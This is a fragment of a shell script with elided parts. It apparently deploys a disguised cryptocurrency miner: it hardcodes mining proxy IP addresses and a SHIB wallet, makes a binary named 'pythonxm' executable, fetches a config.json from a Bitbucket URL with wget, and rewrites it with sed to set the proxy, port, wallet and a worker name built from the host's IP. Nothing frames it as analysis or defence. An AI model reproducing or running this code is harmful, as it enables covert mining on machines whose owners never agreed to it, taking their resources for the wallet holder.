...
HZ_PROX1=139.59.164.251
HZ_PROX2=139.59.164.251
EU_PROX=159.65.30.104
US_PROX=139.59.164.251
CA_PROX=139.59.164.251
ASIA_PROX=128.199.71.34
...
#Keys
W_XM="SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46"
...
then
    ...
    chmod +x pythonxm
    #                Config
    wget -q https://bitbucket.org/solomase/sempak/raw/c49cda1462d6e35a852544c02255392a7ca15548/config.json
    sed -i "s+dagger+RV_$IPNAME+g" config.json
    sed -i "s+138.68.148.132+$PROX+g" config.json
    sed -i "s+:3333+:$XMPort+g" config.json
    sed -i "s+SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46+$W_XM+g" config.json
